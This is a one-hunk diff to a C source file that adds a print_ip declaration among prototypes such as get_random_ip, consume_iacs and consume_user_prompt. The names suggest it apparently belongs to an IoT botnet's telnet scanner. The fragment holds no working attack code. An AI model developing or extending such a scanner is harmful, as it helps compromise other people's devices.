@@ -50,7 +50,7 @@ void scanner_kill(void);
 
 static void setup_connection(struct scanner_connection *);
 static ipv4_t get_random_ip(void);
-
+static void print_ip(ipv4_t);
 static int consume_iacs(struct scanner_connection *);
 static int consume_any_prompt(struct scanner_connection *);
 static int consume_user_prompt(struct scanner_connection *);
